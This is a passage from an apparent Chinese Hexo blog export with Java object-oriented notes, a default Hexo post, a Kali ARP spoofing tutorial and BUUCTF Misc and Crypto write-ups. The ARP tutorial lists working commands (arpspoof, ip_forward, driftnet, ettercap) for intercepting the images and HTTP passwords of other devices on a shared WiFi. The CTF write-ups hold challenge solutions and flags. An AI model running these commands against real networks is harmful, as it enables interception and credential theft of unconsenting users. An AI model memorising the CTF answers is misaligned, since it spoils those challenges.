operator">=</span> newChannel<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//设置音量方法</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setVolume</span><span class="token punctuation">(</span><span class="token keyword">int</span> newVolumeLevel<span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">if</span><span class="token punctuation">(</span>on <span class="token operator">&amp;&amp;</span> newVolumeLevel <span class="token operator">>=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> newVolumeLevel <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">)</span>       volumeLevel <span class="token operator">=</span> newVolumeLevel<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//加台方法</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">channelUp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">if</span><span class="token punctuation">(</span>on <span class="token operator">&amp;&amp;</span> channel <span class="token operator">&lt;</span> <span class="token number">120</span><span class="token punctuation">)</span>       channel<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//减台方法</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">channelDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">if</span><span class="token punctuation">(</span>on <span class="token operator">&amp;&amp;</span> channel <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span>       channel<span class="token operator">--</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//加音方法</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">volumeUp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">if</span><span class="token punctuation">(</span>on <span class="token operator">&amp;&amp;</span> volumeLevel<span class="token operator">&lt;</span><span class="token number">7</span><span class="token punctuation">)</span>       volumeLevel<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//减音方法</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">volumeDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">if</span><span class="token punctuation">(</span>on <span class="token operator">&amp;&amp;</span> volumeLevel<span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span>       volumeLevel<span class="token operator">--</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul><blockquote><p>使用构造方法创建对象</p></blockquote><ul><li><em>构造方法的名字必须和类的名字相同</em></li><li><em>构造方法没有返回值</em></li><li>构造方法在创建对象时用 new 调用，起初始化对象的作用</li><li>构造方法可以重载(同名不同参)</li></ul><h3 id="通过引用变量访问对象"><a href="#通过引用变量访问对象" class="headerlink" title="通过引用变量访问对象"></a>通过引用变量访问对象</h3><blockquote><p>引用变量和引用类型</p></blockquote><ul><li>对象是通过“对象引用变量”来访问的</li><li>类是引用类型，该类型的变量都可以引用该类的一个实例</li><li>举例:<br>TV tv1 = new TV(); 实际上是TV类声明了一个变量tv1,然后把用new TV()创建的对象赋给TV类的变量tv1</li><li>严格来讲对象引用变量个对象是不同的，但是大多数情况下这种差别可忽略不记，可以直接把tv1看成是TV类的一个对象</li></ul><blockquote><p>访问对象的数据和方法 (用圆点运算符 “ . ”)</p></blockquote><ul><li>对象.数据域<br>如：TV tv1 = new TV(); tv1.channel = 1; tv1.volumeLevel = 3;</li><li>对象.方法名(参数)<br>如：tv1.volumeDown(); tv1.setChannel(3);</li><li>对象是类的实例，本例中的数据域和方法依赖于某个实例对象。（注意区分和静态方法的调用方式）</li></ul><blockquote><p>引用数据域和null值</p></blockquote><ul><li>如果一个引用类型的数据域没有任何对象，那么这个数据域有一个特殊的Java值null。</li><li>null、true、false 是Java直接量</li><li>类中各数据域类型的默认值<ol><li>引用类型的数据域默认值是 null，</li><li>数值数据域默认值是 0，</li><li>boolean 类型默认值是false,</li><li>char 类型默认值是 ‘\u0000’</li></ol></li><li>Java没有给方法中的局部变量赋默认值</li></ul><blockquote><p>基本类型和引用类型的区别</p></blockquote><ul><li>变量的本质是内存单元的地址</li><li>基本类型变量在内存中存储一个值</li><li>引用类型在内存中存的是对象的引用(地址中存的还是地址)</li></ul><blockquote><p>使用Java库中的类</p></blockquote><ul><li>Date</li><li>Random</li><li>Point2D</li><li>……</li></ul><h3 id="静态变量、常量和方法"><a href="#静态变量、常量和方法" class="headerlink" title="静态变量、常量和方法"></a>静态变量、常量和方法</h3><blockquote><p>静态变量被勒种所有对象所共享，静态方法不能访问类中的实例成员。</p></blockquote><ul><li>静态变量： static int numberOfObjects;</li><li>静态方法： ststic int getNumberOfbjects() {return numberOfObjects;}</li><li>静态常量： final static double PI = 3.141592654;</li><li>访问静态方法： 类名.方法名(参数)</li><li>访问静态变量： 类名.静态变量<br>PS：和你想的一样，静态类型只不过是 加了 static</li></ul><h3 id="可见性修饰符"><a href="#可见性修饰符" class="headerlink" title="可见性修饰符"></a>可见性修饰符</h3><blockquote><p>可见性修饰符可以用于确定一个类以及它的成员的可见性</p></blockquote><ul><li>包可以用来组织类。使用 package packageName; 这条语句之前不可以有注释，也不能有空白</li><li>public：在类、方法和数据域之前使用，表示它们可以被任何其他的类访问。</li><li>如果没有使用可见性修饰符，那么则默认类、方法、数据域仅可以被同一个包中的类访问。</li><li>private：修饰限定方法和数据域只能在它自己的类中被访问</li><li>protected:<br>PS：private只能应用在类的成员上，而public可以应用在类或类的成员上</li></ul><h3 id="数据域封装"><a href="#数据域封装" class="headerlink" title="数据域封装"></a>数据域封装</h3><blockquote><p>为了避免对数据域的直接修改，使用private将数据域声明为私有的，此成为数据域封装</p></blockquote><ul><li>get访问器<br> public returnType getPropertyName()<br> pubic boolean isPropertyName()</li><li>set修改器<br> public void setPropertyName(dataType propertyValue)</li></ul><h3 id="向方法传递对象参数"><a href="#向方法传递对象参数" class="headerlink" title="向方法传递对象参数"></a>向方法传递对象参数</h3><blockquote><p>给方法传递一个对象，是将对象的引用传递给方法</p></blockquote><ul><li>Java只有一种参数传递方式：值传递</li><li>当传递基本类型参数时，传递的是实参的值。形参改变，实参并不改变</li><li>传递引用类型时，传递的是对象的引用。（也叫传共享）</li></ul><h3 id="对象数组"><a href="#对象数组" class="headerlink" title="对象数组"></a>对象数组</h3><blockquote><p>数组既可以存储基本类型值，也可以存储对象。</p></blockquote><ul><li>对象数组的创建<ol><li>假设已创建Circle类</li><li>Circle[] circleArray = new Circle[];</li></ol></li><li>对象的数组实际上是引用变量的数组。</li><li>当使用new操作符创建对象数组后，这个数组中的每个元素都是默认值为 null 的引用变量。</li></ul><h3 id="不可变对象和类"><a href="#不可变对象和类" class="headerlink" title="不可变对象和类"></a>不可变对象和类</h3><blockquote><p>可以定义不可变类来产生不可变对象。不可变对象的内容不能被改变。</p></blockquote><ul><li>要使一个类成为不可变的，必须具备以下条件<ol><li>所有数据域都是私有的</li><li>没有修改器(set)</li><li>没有一个返回指向可变数据域的引用的访问器方法</li></ol></li></ul><h3 id="变量的作用域"><a href="#变量的作用域" class="headerlink" title="变量的作用域"></a>变量的作用域</h3><blockquote><p>实例变量和静态变量的作用域是整个类，无论变量实在哪里声明的。</p></blockquote><ul><li>一个类的实例和静态变量成为类变量或数据域。</li><li>方法内部定义的变量是局部变量。</li><li>无论在何处声明，类变量的作用域是整个类。类的方法和变量可以再类中一人一个顺序出现。</li><li>注意：当一个数据域是基于另一个数据域的引用来进行初始化时则不是这样。也就是说，你要 int i = j + 1;那你必须先改定 j 吧。</li><li>类变量只能声明一次，但是在一个方法的不同非嵌套块中，可以多次声明相同的变量名</li><li>如果一个局部变量和一个类变量具有相同的名字，那么局部变量优先，而同名的类变量会被隐藏</li></ul><h3 id="this引用"><a href="#this引用" class="headerlink" title="this引用"></a>this引用</h3><blockquote><p>this引用对象自身。它可以在构造方法内部用于调用同一个类的其他构造方法。</p></blockquote><ul><li>使用this引用隐藏数据域</li><li>使用this调用构造方法</li></ul><h3 id="本章小结"><a href="#本章小结" class="headerlink" title="本章小结"></a>本章小结</h3><ol><li>类是对象的模板。它定义对象的属性，并提供用于以创建对象的构造方法以及操作对象的普通方法。</li><li>类是一种数据类型。可以用它声明对象引用变量。对象引用变量中似乎存放一个对象，但实际上，它包含的只是对该对象的引用。严格来讲，对象引用变量和对象是不同的，但是大多数情况下，他们的区别是可以忽略的。</li><li>对象是类的实例。可以用new操作符来创建对象，使用点运算符“ . ”通过对象的用用变量来访问该变量的对象成员。</li><li>实例变量或方法属于类的一个实例。它的使用与各自的实例相关联。静态变量是北亭一个类的所有实例所共享的。可以在不使用实例的情况下调用静态方法。</li><li>类的每个实例都能访问这个类的静态方法和静态变量。然而，为清晰起见，最好使用“类名.变量”和“类名.方法”来调用静态成员。</li><li>可见性修饰符指定类、方法和数据是如何被访问的。公共类、方法、或数据可以被任何客户访问，私有的方法或数据只能在本类中被访问。</li><li>可以提供get(访问器)和set(修改器)方法使客户能够看到和修改数据。</li><li>get方法具有方法签名public returnType getPropertyName()。如果返回值类型是boolean型，则get方法应该定义为public boolean osPropertyName()。set方法具有方法签名public void setPropertyName(dataType propertyValue)。</li><li>所有传递给方法的参数都是值传递的。对于基本类型的参数，传递的是实际值；而若参数是引用类型，则传递的是数据的引用。</li><li>Java数组是一个可以包含基本类型值或对象类型值得队形。当创建一个对象数组时，它的元素被赋予默认值null。</li><li>一旦被创建，不可变对象就不能再改变。为了防止用户修改一个对象，可以定义该对象为不可变对象。</li><li>实例变量和静态变量的作用域是整个类，无论该变量在什么位置定义。实例变量和静态变量可以在类中的任何位置定义。</li><li>this关键字可以用于引用进行调用的对象。它也可以用于在构造方法中来调用同一个类的另外一个构造方法。</li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java对象和类 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>README</title>
      <link href="/2020/03/18/readme/"/>
      <url>/2020/03/18/readme/</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/03/18/hello-world/"/>
      <url>/2020/03/18/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kali虚拟机下的arp欺骗</title>
      <link href="/2020/03/12/shen-tou-ce-shi/"/>
      <url>/2020/03/12/shen-tou-ce-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="arp攻击"><a href="#arp攻击" class="headerlink" title="arp攻击"></a>arp攻击</h1><h3 id="查看本机ip"><a href="#查看本机ip" class="headerlink" title="查看本机ip"></a>查看本机ip</h3><h3 id="使用指令ifconfig-inet之后的便是IPV4地址"><a href="#使用指令ifconfig-inet之后的便是IPV4地址" class="headerlink" title="使用指令ifconfig               inet之后的便是IPV4地址"></a>使用指令ifconfig               inet之后的便是IPV4地址</h3><p><img src="https://img-blog.csdnimg.cn/20200118180953287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1YW5fcWlhbzkyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="查一下和自己在同一WiFi下的其他设备"><a href="#查一下和自己在同一WiFi下的其他设备" class="headerlink" title="查一下和自己在同一WiFi下的其他设备"></a>查一下和自己在同一WiFi下的其他设备</h3><h4 id="命令：-fping-g-r-0-s-192-168-31-48-24-grep-alive"><a href="#命令：-fping-g-r-0-s-192-168-31-48-24-grep-alive" class="headerlink" title="命令： fping -g -r 0 -s 192.168.31.48/24 | grep alive"></a>命令： fping -g -r 0 -s 192.168.31.48/24 | grep alive</h4><h3 id="进行目标IP系统探测（探测是什么系统：电脑or手机）"><a href="#进行目标IP系统探测（探测是什么系统：电脑or手机）" class="headerlink" title="进行目标IP系统探测（探测是什么系统：电脑or手机）"></a>进行目标IP系统探测（探测是什么系统：电脑or手机）</h3><h4 id="命令：nmap-T4-O-目标IP"><a href="#命令：nmap-T4-O-目标IP" class="headerlink" title="命令：nmap -T4 -O (目标IP)"></a>命令：nmap -T4 -O (目标IP)</h4><h3 id="arp断网攻击"><a href="#arp断网攻击" class="headerlink" title="arp断网攻击"></a>arp断网攻击</h3><h4 id="命令：arpspoof-i-eth0-t-192-168-31-140-r-192-168-31-1"><a href="#命令：arpspoof-i-eth0-t-192-168-31-140-r-192-168-31-1" class="headerlink" title="命令：arpspoof -i eth0 -t 192.168.31.140 -r 192.168.31.1"></a>命令：arpspoof -i eth0 -t 192.168.31.140 -r 192.168.31.1</h4><h4 id="形式：arpspoof-i-eth0（一般虚拟机默认为此）-t-目标IP-r-网关"><a href="#形式：arpspoof-i-eth0（一般虚拟机默认为此）-t-目标IP-r-网关" class="headerlink" title="形式：arpspoof -i eth0（一般虚拟机默认为此） -t 目标IP -r 网关"></a>形式：arpspoof -i eth0（一般虚拟机默认为此） -t 目标IP -r 网关</h4><h1 id="arp欺骗"><a href="#arp欺骗" class="headerlink" title="arp欺骗"></a>arp欺骗</h1><h3 id="查本机ip-————–-ifconfig"><a href="#查本机ip-————–-ifconfig" class="headerlink" title="查本机ip  ————–   ifconfig"></a>查本机ip  ————–   ifconfig</h3><h3 id="查和自己处在同一WiFi下的IP-————-fping-g-r-0-s-192-168-31-48-24-grep-alive"><a href="#查和自己处在同一WiFi下的IP-————-fping-g-r-0-s-192-168-31-48-24-grep-alive" class="headerlink" title="查和自己处在同一WiFi下的IP   ———— fping -g -r 0 -s 192.168.31.48/24 | grep alive"></a>查和自己处在同一WiFi下的IP   ———— fping -g -r 0 -s 192.168.31.48/24 | grep alive</h3><h3 id="既然是欺骗，那就不能让目标主机断网，所以要更改配置文件"><a href="#既然是欺骗，那就不能让目标主机断网，所以要更改配置文件" class="headerlink" title="既然是欺骗，那就不能让目标主机断网，所以要更改配置文件"></a>既然是欺骗，那就不能让目标主机断网，所以要更改配置文件</h3><h4 id="命令：echo-1-gt-proc-sys-net-ipv4-ip-forward"><a href="#命令：echo-1-gt-proc-sys-net-ipv4-ip-forward" class="headerlink" title="命令：echo 1 > /proc/sys/net/ipv4/ip_forward"></a>命令：echo 1 &gt; /proc/sys/net/ipv4/ip_forward</h4><h4 id="cat-proc-sys-net-ipv4-ip-forward"><a href="#cat-proc-sys-net-ipv4-ip-forward" class="headerlink" title="cat  /proc/sys/net/ipv4/ip_forward"></a>cat  /proc/sys/net/ipv4/ip_forward</h4><h3 id="arp攻击-1"><a href="#arp攻击-1" class="headerlink" title="arp攻击"></a>arp攻击</h3><h4 id="命令：arpspoof-i-eth0-t-192-168-31-140-r-192-168-31-1-1"><a href="#命令：arpspoof-i-eth0-t-192-168-31-140-r-192-168-31-1-1" class="headerlink" title="命令：arpspoof -i eth0 -t 192.168.31.140 -r 192.168.31.1"></a>命令：arpspoof -i eth0 -t 192.168.31.140 -r 192.168.31.1</h4><h3 id="抓图片"><a href="#抓图片" class="headerlink" title="抓图片"></a>抓图片</h3><h4 id="driftnet-i-eth0"><a href="#driftnet-i-eth0" class="headerlink" title="driftnet -i eth0"></a>driftnet -i eth0</h4><h3 id="实现密码嗅探"><a href="#实现密码嗅探" class="headerlink" title="实现密码嗅探"></a>实现密码嗅探</h3><h4 id="ettercap-Tq-i-eth0"><a href="#ettercap-Tq-i-eth0" class="headerlink" title="ettercap -Tq -i eth0"></a>ettercap -Tq -i eth0</h4><p>注意：图片嗅探会有延迟，没有想象中那么及时。<br>           密码嗅探只能嗅探http的，https不行。<br> 欢迎大家批评指正，本文仅供小白满足好奇心。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> Kali-渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTFMiscWriteup</title>
      <link href="/2020/03/12/buuctfmiscwriteup/"/>
      <url>/2020/03/12/buuctfmiscwriteup/</url>
      
        <content type="html"><![CDATA[<h2 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h2><p>题目链接：<a href="https://buuoj.cn/challenges#%E9%87%91%E4%B8%89%E8%83%96" target="_blank" rel="noopener">https://buuoj.cn/challenges#%E9%87%91%E4%B8%89%E8%83%96</a><br>思路：用PhotoShop查看图层，会找到三张上边含有flag信息的.</p><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>题目链接：<a href="https://buuoj.cn/challenges#%E4%BA%8C%E7%BB%B4%E7%A0%81" target="_blank" rel="noopener">https://buuoj.cn/challenges#%E4%BA%8C%E7%BB%B4%E7%A0%81</a><br>思路：binwalk 分析二维码图片，然后分解，得到<img src="https://img-blog.csdnimg.cn/20200117180949393.png" alt="在这里插入图片描述"><br>根据提示：密码为4位数字<br>用ziperello跑一下<img src="https://img-blog.csdnimg.cn/20200117181433909.png" alt="在这里插入图片描述"><br>然后解压得到<img src="https://img-blog.csdnimg.cn/20200117181512807.png" alt="在这里插入图片描述"><br>注意：题上说flag{}形式。改一下。</p><h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p>题目链接：<a href="https://buuoj.cn/challenges#%E5%A4%A7%E7%99%BD" target="_blank" rel="noopener">https://buuoj.cn/challenges#%E5%A4%A7%E7%99%BD</a><br>思路：目测高度不够，查一下高度和宽的的16进制，改一下，看到flag.</p><h2 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h2><p>题目链接：<a href="https://buuoj.cn/challenges#%E5%9F%BA%E7%A1%80%E7%A0%B4%E8%A7%A3" target="_blank" rel="noopener">https://buuoj.cn/challenges#%E5%9F%BA%E7%A1%80%E7%A0%B4%E8%A7%A3</a><br>思路：<img src="https://img-blog.csdnimg.cn/2020011718212620.png" alt="在这里插入图片描述"><br>用<br><img src="https://img-blog.csdnimg.cn/20200117182143275.png" alt=""><br>跑一下。</p><h2 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h2><p>题目链接：<a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">https://buuoj.cn/challenges</a><br>思路：<br>直接扔到WinHex里查找flag,得到如下<br><img src="https://img-blog.csdnimg.cn/20200117182630180.png" alt="在这里插入图片描述"></p><h2 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h2><p>题目链接：<a href="https://buuoj.cn/challenges#%E4%B9%8C%E9%95%87%E5%B3%B0%E4%BC%9A%E7%A7%8D%E5%9B%BE" target="_blank" rel="noopener">https://buuoj.cn/challenges#%E4%B9%8C%E9%95%87%E5%B3%B0%E4%BC%9A%E7%A7%8D%E5%9B%BE</a><br>思路：<br>直接扔到WinHex里边，查找flag得到<img src="https://img-blog.csdnimg.cn/20200117182857164.png" alt="在这里插入图片描述"></p><h2 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h2><p>题目链接：<a href="https://buuoj.cn/challenges#rar" target="_blank" rel="noopener">https://buuoj.cn/challenges#rar</a><br>思路：直接解压缩，得到.rar的压缩包，然后用ARPR跑一下，四位数字密码<img src="https://img-blog.csdnimg.cn/20200117183724323.png" alt="在这里插入图片描述">。</p><h2 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h2><p>题目链接：<a href="https://buuoj.cn/challenges#ningen" target="_blank" rel="noopener">https://buuoj.cn/challenges#ningen</a><br>思路：binwalk分析然后分离，得到9271.zip，然后用<br><img src="https://img-blog.csdnimg.cn/20200117183925934.png" alt="在这里插入图片描述">跑一下。<br><img src="https://img-blog.csdnimg.cn/20200117184019489.png" alt="在这里插入图片描述"><br>flag{b025fc9ca797a67d2103bfbc407a6d5f}<br>只是一些入门的CTF，欢迎大家发表意见。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-Crypto</title>
      <link href="/2020/03/10/buuctf-crypto/"/>
      <url>/2020/03/10/buuctf-crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><ul><li>e00cf25ad42683b3df678c61f42c6bda</li><li>由题意知，此为md5密码，解MD5即可。</li><li>解密链接：<a href="http://tool.geekapp.cn/decrypt.php" target="_blank" rel="noopener">md5</a></li><li>flag{admin1}<a id="more"></a><h4 id="看我回旋踢"><a href="#看我回旋踢" class="headerlink" title="看我回旋踢"></a>看我回旋踢</h4></li><li>synt{5pq1004q-86n5-46q8-o720-oro5on0417r1}</li><li>由题意知，可为凯撒密码，写程序即可解密</li><li>解密程序</li></ul><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#include &lt;iostream></span><span class="token comment" spellcheck="true">#include&lt;string></span>using namespace std<span class="token punctuation">;</span>char upper_E3<span class="token punctuation">(</span>char str,int shift<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> char<span class="token punctuation">((</span>str-65+shift<span class="token punctuation">)</span>%26+65<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>char lower_E3<span class="token punctuation">(</span>char str,int shift<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> char<span class="token punctuation">((</span>str-97+shift<span class="token punctuation">)</span>%26+97<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>int main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    string str <span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>//明文    string str1<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>//密文    int <span class="token function">shift</span> <span class="token operator">=</span> 0<span class="token punctuation">;</span>    cout  <span class="token operator">&lt;&lt;</span> <span class="token string">"输入明文："</span><span class="token punctuation">;</span>    getline<span class="token punctuation">(</span>cin,str<span class="token punctuation">)</span><span class="token punctuation">;</span>   /* cout <span class="token operator">&lt;&lt;</span> <span class="token string">"输入移位量："</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> <span class="token function">shift</span><span class="token punctuation">;</span>*/    <span class="token keyword">while</span> <span class="token punctuation">(</span>1<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        str1 <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>int i <span class="token operator">=</span> 0<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> str.length<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i++<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>isalpha<span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">))</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>islower<span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">))</span>                    str1 +<span class="token operator">=</span> lower_E3<span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span>, shift<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>isupper<span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">))</span>                    str1 +<span class="token operator">=</span> upper_E3<span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span>, shift<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                str1 +<span class="token operator">=</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"密文："</span> <span class="token operator">&lt;&lt;</span> str1 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        if<span class="token punctuation">(</span>str1<span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'f'</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        shift++<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> 0<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><ul><li>flag{5cd1004d-86a5-46d8-b720-beb5ba0417e1}</li></ul><h4 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h4><ul><li>%66%6c%61%67%7b%61%6e%64%20%31%3d%31%7d</li><li>由题意知此为URL编码，找到对应的解密工具即可</li><li>解密链接：<a href="http://tool.chinaz.com/tools/urlencode.aspx" target="_blank" rel="noopener">url编码</a></li><li>flag{and 1=1}<h4 id="一眼就解密"><a href="#一眼就解密" class="headerlink" title="一眼就解密"></a>一眼就解密</h4></li><li>ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30= </li><li>可看出此为base64密码</li><li>解密链接：<a href="https://www.sojson.com/base64.html" target="_blank" rel="noopener">base64</a></li><li>flag{THE_FLAG_OF_THIS_STRING}<h4 id="摩斯"><a href="#摩斯" class="headerlink" title="摩斯"></a>摩斯</h4></li><li>.. .-.. — …- . -.– — ..-</li><li>显而易见此为摩斯密码</li><li>解密链接：<a href="https://www.jb51.net/tools/morse.htm" target="_blank" rel="noopener">摩斯</a></li><li>flag{ILOVEYOU}<h4 id="变异凯撒"><a href="#变异凯撒" class="headerlink" title="变异凯撒"></a>变异凯撒</h4></li><li>afZ_r9VYfScOeO_UL^RWUc</li><li>首先要明白，凯撒密码轮转的规则，然后从题不难发现以下规律:<pre><code>  a-------f       +5  f-------l       +6</code></pre>按照此规律去编写代码如下：</li><li>Python解密<pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 定义解密函数</span>def decode<span class="token punctuation">(</span>cipher,shift<span class="token punctuation">)</span>:  